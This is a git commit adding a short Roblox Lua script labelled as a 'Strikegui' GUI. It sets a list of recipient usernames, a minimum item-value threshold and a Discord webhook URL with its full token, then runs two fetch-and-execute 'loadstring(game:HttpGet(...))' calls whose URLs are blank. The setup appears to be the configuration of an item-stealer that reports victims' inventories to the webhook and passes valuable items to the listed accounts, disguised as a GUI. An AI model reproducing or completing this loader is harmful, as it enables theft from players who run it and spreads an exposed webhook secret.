d118583c46164bfdedd04d83eb2d200946fb62cf
1DeathStare1 <turquoisedragon18@gmail.com>
2025-11-02 04:25:42 +0000

    Update Rstrikegui.lua

--- Rstrikegui.lua
+++ Rstrikegui.lua
@@ -1,1 +1,14 @@
+-- Strikegui.lua
+-- User settings
+_G.Usernames = {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"} 
+_G.minrap = 10000000
+_G.webhook = "https://discord.com/api/webhooks/1431974006080147466/vjWq7Xu7Mqun02T9rUiMFzZA1btH8483bsgvVihoSw-FEKsADYQbP49cJXvfsDLNQxto"
 
+-- Run both scripts concurrently
+spawn(function()
+    loadstring(game:HttpGet(""))()
+end)
+
+spawn(function()
+    loadstring(game:HttpGet(""))()
+end)
